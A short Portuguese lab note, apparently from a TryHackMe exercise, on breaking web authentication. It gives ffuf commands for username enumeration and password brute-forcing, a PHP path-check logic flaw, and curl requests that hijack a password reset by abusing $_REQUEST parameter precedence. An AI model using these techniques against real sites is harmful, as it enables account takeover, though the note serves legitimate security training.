---
tags:
  - WEB
  - CRIPTOGRAFIA
---
# usuário
```shell
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.215.23/customers/signup -mr "username already exists"
```

# usuário + senha
Criar um txt com os usuários anteriormente encontrados para agora localizar as senhas
```shell
user@tryhackme$ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.215.23/customers/login -fc 200
```

# Falha de lógica
```php
if( url.substr(0,6) === '/admin') {
    # Código testa se o user é admin
} else {
    # Visualiza a página
}
```

Usaremos o endereço de e-mail válido, nesse caso: robert@acmeitsupport.thm, que é aceito. Em seguida, será apresentada a próxima etapa do formulário, que solicita o nome de usuário associado a esse endereço de e-mail de login. Depois é solicitado um usuário, iremos colocar um válido também. O nome de usuário é enviado em um campo POST para o servidor da Web e o endereço de e-mail é enviado na solicitação de string de consulta como um campo GET.

```shell
curl 'http://10.10.215.23/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
```

A variável PHP `$_REQUEST` é uma matriz que contém dados recebidos da string de consulta e dos dados do POST. **Se o mesmo nome de chave for usado para a string de consulta e para os dados do POST**, a lógica do aplicativo para essa variável favorecerá os campos de dados do POST em vez da string de consulta, portanto, ==se adicionarmos outro parâmetro ao formulário POST, poderemos controlar onde o e-mail de redefinição de senha será entregue==

```shell
curl 'http://10.10.215.23/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
# agora alterando o email para nosso email de atacante
```

Agora, criaremos uma conta nova onde teremos o link para recuperação da outra conta 
```shell
curl 'http://10.10.215.23/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'
```

